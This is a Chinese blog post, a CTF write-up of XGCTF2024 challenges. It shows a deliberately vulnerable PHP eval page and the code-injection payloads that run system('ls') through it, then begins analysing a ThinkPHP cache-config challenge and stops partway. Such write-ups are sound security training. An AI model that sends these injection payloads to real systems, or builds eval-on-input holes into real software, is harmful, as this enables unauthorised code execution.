
<!DOCTYPE html><html lang="zh-CN">

<head>
  <meta charset="utf-8">
  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.28.1" theme-name="Stellar" theme-version="1.28.1">
  
  <meta name="generator" content="Hexo 7.2.0">
  <meta http-equiv='x-dns-prefetch-control' content='on' />
  
  <meta name="renderer" content="webkit">
  <meta name="force-rendering" content="webkit">
  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
  <meta name="HandheldFriendly" content="True" >
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f9fafb">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
  
  <title>CTF刷题 - hybcx's blog</title>

  
    <meta name="description" content="[XGCTF2024] CodeInject &lt;?php  #Author: h1xa  error_reporting(0); show_source(__FILE__);  eval(&quot;var_dump((Object)$_POST[1]);&quot;); 可以看到接受一个参数1的参数值，然后强转为对象，接着用var_dump函数输出（输出对象的结构和内容） 看着简单，但是分析了wp发现我还是有">
<meta property="og:type" content="article">
<meta property="og:title" content="CTF刷题">
<meta property="og:url" content="http://hybcx.xyz/2024/07/14/ctf-shua-ti/index.html">
<meta property="og:site_name" content="hybcx&#39;s blog">
<meta property="og:description" content="[XGCTF2024] CodeInject &lt;?php  #Author: h1xa  error_reporting(0); show_source(__FILE__);  eval(&quot;var_dump((Object)$_POST[1]);&quot;); 可以看到接受一个参数1的参数值，然后强转为对象，接着用var_dump函数输出（输出对象的结构和内容） 看着简单，但是分析了wp发现我还是有">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407151620463.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407151620464.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407151620465.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407151620466.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407151620467.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407151620469.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407151620470.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407151620471.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407151620472.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407151620473.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407151620474.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407151620475.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407151620476.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407151620477.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407151620478.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157044.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157045.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157046.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157047.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157048.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157049.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157050.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157051.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157052.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157053.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157054.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157055.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157056.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157057.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157058.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157059.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157060.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157061.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157062.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157063.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157064.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157065.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157066.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157067.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157068.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157069.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157070.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157071.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157072.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157073.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157074.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157075.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157076.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157077.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157078.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157079.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157080.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157081.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157082.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157083.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157084.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157085.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157086.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157087.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157088.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157089.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157090.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157091.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157092.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157094.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157095.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157096.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157097.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157098.png">
<meta property="article:published_time" content="2024-07-14T07:35:57.000Z">
<meta property="article:modified_time" content="2024-07-19T14:03:52.442Z">
<meta property="article:author" content="hybcx">
<meta property="article:tag" content="CTF赛事">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407151620463.png">
  
  
  
  <meta name="keywords" content="CTF赛事">

  <!-- feed -->
  
    <link rel="alternate" href="/atom.xml" title="hybcx's blog" type="application/atom+xml">
  

  <link rel="stylesheet" href="/css/main.css?v=1.28.1">

  
    <link rel="shortcut icon" href="/medias/logo.png">
  

  
    
<link rel="stylesheet" href="https://gcore.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/styles/atom-one-dark.min.css">

  

  <link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont/style.css" media="print" onload="this.media='all'">

<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head>
<body>

<div class="l_body s:aa content tech" id="start" layout="post" ><aside class="l_left"><div class="leftbar-container">


<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/medias/avatar.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">hybcx's blog</div><div class="sub normal cap">人生当是精彩的</div><div class="sub hover cap" style="opacity:0"> 何必忧虑未来！</div></a></div></header>

<div class="nav-area">
<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>


<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="文档" href="/wiki/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M14.25 4.48v3.057c0 .111 0 .27.02.406a.936.936 0 0 0 .445.683a.96.96 0 0 0 .783.072c.13-.04.272-.108.378-.159L17 8.005l1.124.534c.106.05.248.119.378.16a.958.958 0 0 0 .783-.073a.936.936 0 0 0 .444-.683c.021-.136.021-.295.021-.406V3.031c.113-.005.224-.01.332-.013C21.154 2.98 22 3.86 22 4.933v11.21c0 1.112-.906 2.01-2.015 2.08c-.97.06-2.108.179-2.985.41c-1.082.286-1.99 1.068-3.373 1.436c-.626.167-1.324.257-1.627.323V5.174c.32-.079 1.382-.203 1.674-.371c.184-.107.377-.216.576-.323m5.478 8.338a.75.75 0 0 1-.546.91l-4 1a.75.75 0 0 1-.364-1.456l4-1a.75.75 0 0 1 .91.546" clip-rule="evenodd"/><path fill="currentColor" d="M18.25 3.151c-.62.073-1.23.18-1.75.336a8.2 8.2 0 0 0-.75.27v3.182l.75-.356l.008-.005a1.13 1.13 0 0 1 .492-.13c.047 0 .094.004.138.01c.175.029.315.1.354.12l.009.005l.749.356V3.647z"/><path fill="currentColor" d="M12 5.214c-.334-.064-1.057-.161-1.718-.339C8.938 4.515 8.05 3.765 7 3.487c-.887-.234-2.041-.352-3.018-.412C2.886 3.007 2 3.9 2 4.998v11.146c0 1.11.906 2.01 2.015 2.079c.97.06 2.108.179 2.985.41c.486.129 1.216.431 1.873.726c1.005.451 2.052.797 3.127 1.034z" opacity=".5"/><path fill="currentColor" d="M4.273 12.818a.75.75 0 0 1 .91-.545l4 1a.75.75 0 1 1-.365 1.455l-4-1a.75.75 0 0 1-.545-.91m.909-4.545a.75.75 0 1 0-.364 1.455l4 1a.75.75 0 0 0 .364-1.455z"/></svg></a><a class="nav-item" title="关于" href="/about/" style="color:#FA6400"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg></a><a class="nav-item" title="友链" href="/friends/" style="color:#F44336"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="m13.629 20.472l-.542.916c-.483.816-1.69.816-2.174 0l-.542-.916c-.42-.71-.63-1.066-.968-1.262c-.338-.197-.763-.204-1.613-.219c-1.256-.021-2.043-.098-2.703-.372a5 5 0 0 1-2.706-2.706C2 14.995 2 13.83 2 11.5v-1c0-3.273 0-4.91.737-6.112a5 5 0 0 1 1.65-1.651C5.59 2 7.228 2 10.5 2h3c3.273 0 4.91 0 6.113.737a5 5 0 0 1 1.65 1.65C22 5.59 22 7.228 22 10.5v1c0 2.33 0 3.495-.38 4.413a5 5 0 0 1-2.707 2.706c-.66.274-1.447.35-2.703.372c-.85.015-1.275.022-1.613.219c-.338.196-.548.551-.968 1.262" opacity=".5"/><path fill="currentColor" d="M10.99 14.308c-1.327-.978-3.49-2.84-3.49-4.593c0-2.677 2.475-3.677 4.5-1.609c2.025-2.068 4.5-1.068 4.5 1.609c0 1.752-2.163 3.615-3.49 4.593c-.454.335-.681.502-1.01.502c-.329 0-.556-.167-1.01-.502"/></svg></a></nav>
</div>
<div class="widgets">


<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/2024/07/25/thm-windows-api-jie-shao/"><span class="title">THM-Windows-API介绍</span></a><a class="item title" href="/2024/07/24/thm-windows-nei-he/"><span class="title">THM-Windows内核</span></a><a class="item title" href="/2024/07/20/thm-shu-ju-xie-lu/"><span class="title">THM-数据泄露</span></a><a class="item title" href="/2024/07/21/linux-ti-quan-zong-jie/"><span class="title">Linux提权总结</span></a><a class="item title" href="/2024/07/16/thm-enumeration/"><span class="title">THM-Enumeration</span></a><a class="item title" href="/2024/07/16/thm-dang-qian-tai-shi/"><span class="title">THM-当前态势</span></a><a class="item title" href="/2024/02/10/thm-linux-quan-xian-ti-sheng/"><span class="title">THM-Linux权限提升</span></a><a class="item title" href="/2024/02/14/thm-basic-pentesting/"><span class="title">THM-Basic Pentesting</span></a><a class="item title" href="/2024/07/20/linux-ti-quan-xue-xi-yi/"><span class="title">Linux提权学习之rbash逃逸</span></a><a class="item title" href="/2023/08/07/qian-xi-mu-lu-chuan-yue/"><span class="title">浅析目录穿越</span></a></div></widget>
</div>
<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/hybchenxing/" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/github-logo2.png"/></a><a class="social" href="https://music.163.com/#/user/home?id=9895561810" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/neteasemusic-icon.png"/></a><a class="social" href="https://space.bilibili.com/1761635300" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/bilibili-icon.png"/></a><a class="social" href="https://muselink.cc/hybcx" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/weChat.png"/></a><a class="social" href="javaScript:void('永夜');" rel="noopener noreferrer"><img class="lazy" id="ThemeM" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/custom/svg/moon.svg"/></a><a class="social" href="javaScript:void('永昼');" rel="noopener noreferrer"><img class="lazy" id="ThemeL" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/custom/svg/sun.svg"/></a></div></footer>
</div></aside><div class="l_main" id="main">





<div class="article banner top">
  <div class="content">
    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/CTF%E8%B5%9B%E4%BA%8B/">CTF赛事</a></div>
<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2024-07-14T07:35:57.000Z">2024-07-14</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2024-07-19T14:03:52.442Z">2024-07-19</time></span></div></div></div>
    
    <div class="bottom only-title">
      
      <div class="text-area">
        <h1 class="text title"><span>CTF刷题</span></h1>
        
      </div>
    </div>
    
  </div>
  </div><article class="md-text content"><h1 id="xgctf2024">[XGCTF2024]</h1>
<h2 id="codeinject">CodeInject</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

<span class="hljs-comment">#Author: h1xa</span>

<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);

<span class="hljs-keyword">eval</span>(<span class="hljs-string">"var_dump((Object)<span class="hljs-subst">$_POST</span>[1]);"</span>);</code></pre>
<p>可以看到接受一个参数1的参数值，然后强转为对象，接着用var_dump函数输出（输出对象的结构和内容）</p>
<p>看着简单，但是分析了wp发现我还是有疑问点。</p>
<p>首先GPT或者本地测试以下，就知道，被强转为对象之后，输入效果如下：</p>
<pre><code class="hljs scss"><span class="hljs-selector-tag">object</span>(stdClass)<span class="hljs-selector-id">#1</span> (<span class="hljs-number">1</span>) { <span class="hljs-selector-attr">[<span class="hljs-string">"scalar"</span>]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">5</span>) "hello" }</code></pre>
<p>因此为了不让我们执行代码的部分被赋值给scalar，我们可以想到闭合逃逸，最终效果应该如下</p>
<pre><code class="hljs scss"><span class="hljs-number">1</span>=<span class="hljs-number">1</span>);<span class="hljs-built_in">system</span>('ls');<span class="hljs-comment">//</span></code></pre>
<p>但是当我尝试改为：<code>1=hello);system('ls');//</code>的时候，就不能执行了，这里问了GPT，给出的解释如下：</p>
<pre><code class="hljs scss"><span class="hljs-comment">// 输入</span>
<span class="hljs-number">1</span>=hello);<span class="hljs-built_in">system</span>('ls');<span class="hljs-comment">//</span>
<span class="hljs-comment">// 结合后的代码</span>
<span class="hljs-built_in">var_dump</span>((Object)hello);<span class="hljs-built_in">system</span>('ls');<span class="hljs-comment">//</span>
<span class="hljs-comment">// 解释</span>
<span class="hljs-built_in">var_dump</span>((Object)hello); <span class="hljs-comment">// 失败，因为 hello 是未定义的常量，会被解释为字符串 'hello'，并产生错误</span>
<span class="hljs-built_in">system</span>('ls'); <span class="hljs-comment">// 不执行，因为前面的错误导致代码未能继续执行</span></code></pre>
<pre><code class="hljs scss">在PHP中，如果一个未定义的标识符出现在代码中，它会被解释为字符串，并产生一个E_NOTICE错误。例如：
echo hello; <span class="hljs-comment">// 输出 "hello" 并产生一个E_NOTICE错误</span>
在你的代码中，<span class="hljs-built_in">var_dump</span>((Object)hello); 中的 hello 被解释为字符串 'hello'，但会产生一个语法错误，导致后续的 <span class="hljs-built_in">system</span>('ls'); 不能被执行。</code></pre>
<p>因此我猜测，靶场对应的环境就是如此，会爆出错误而不能执行后续代码，但当我本地测试发现是可以的。因为不知道如何考察，因此我只能猜测，这与PHP不同版本对应的处理也不同有关。我的是PHP7.4.33，但靶场的版本我找不到。</p>
<p>另外，看了其他师傅的wp发现可以直接这样</p>
<pre><code class="hljs scss"><span class="hljs-number">1</span>=<span class="hljs-built_in">system</span>('ls')<span class="hljs-comment">//等价效果：eval("var_dump((Object)system('ls'));");</span></code></pre>
<p>也就是最后面没有分号结尾，也可以正常执行。针对结果来看，只能认为，这是由于执行代码的优先顺序决定的。</p>
<p>上述等价效果在执行的时候，应该是先执行的system函数，然后将得到的值强转为了对象。（GPT的解释意思也是如此）</p>
<h2 id="tpdoor">tpdoor</h2>
<p>题目源码如下</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

<span class="hljs-keyword">namespace</span> <span class="hljs-title class_">app</span>\<span class="hljs-title class_">controller</span>;

<span class="hljs-keyword">use</span> <span class="hljs-title">app</span>\<span class="hljs-title">BaseController</span>;
<span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">facade</span>\<span class="hljs-title">Db</span>;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Index</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">BaseController</span></span>
<span class="hljs-class"></span>{
    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$middleware</span> = [<span class="hljs-string">'think\middleware\AllowCrossDomain'</span>,<span class="hljs-string">'think\middleware\CheckRequestCache'</span>,<span class="hljs-string">'think\middleware\LoadLangPack'</span>,<span class="hljs-string">'think\middleware\SessionInit'</span>];
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"><span class="hljs-variable">$isCache</span> = <span class="hljs-literal">false</span> , <span class="hljs-variable">$cacheTime</span> = <span class="hljs-number">3600</span></span>)</span>
<span class="hljs-function">    </span>{
        
        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$isCache</span> == <span class="hljs-literal">true</span>){
            <span class="hljs-variable">$config</span> = <span class="hljs-keyword">require</span>  <span class="hljs-keyword">__DIR__</span>.<span class="hljs-string">'/../../config/route.php'</span>;
            <span class="hljs-variable">$config</span>[<span class="hljs-string">'request_cache_key'</span>] = <span class="hljs-variable">$isCache</span>;
            <span class="hljs-variable">$config</span>[<span class="hljs-string">'request_cache_expire'</span>] = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$cacheTime</span>);
            <span class="hljs-variable">$config</span>[<span class="hljs-string">'request_cache_except'</span>] = [];
            <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-keyword">__DIR__</span>.<span class="hljs-string">'/../../config/route.php'</span>, <span class="hljs-string">'&lt;?php return '</span>. <span class="hljs-title function_ invoke__">var_export</span>(<span class="hljs-variable">$config</span>, <span class="hljs-literal">true</span>). <span class="hljs-string">';'</span>);
            <span class="hljs-keyword">return</span> <span class="hljs-string">'cache is enabled'</span>;
        }<span class="hljs-keyword">else</span>{
            <span class="hljs-keyword">return</span> <span class="hljs-string">'Welcome ,cache is disabled'</span>;
        }
    }

}</code></pre>
<p>上述代码，就是为config/route.php文件进行某些配置修改，思路可以是关注他修改了哪些值，我们可以跟踪这些值的去向，或许就有发现。</p>
<p>首先是信息搜集，这里看到<code>$config['request_cache_key'] = $isCache;</code>，我们可以搜一下对应的tp版本。</p>
<p>这里我觉得我只能看tp的github一个个找，才能找到源码，否则，真不能根据关键词直接定位。这里看到tp的framework的8.0.3含有request_cache_key关键词，下载源码看一下</p>
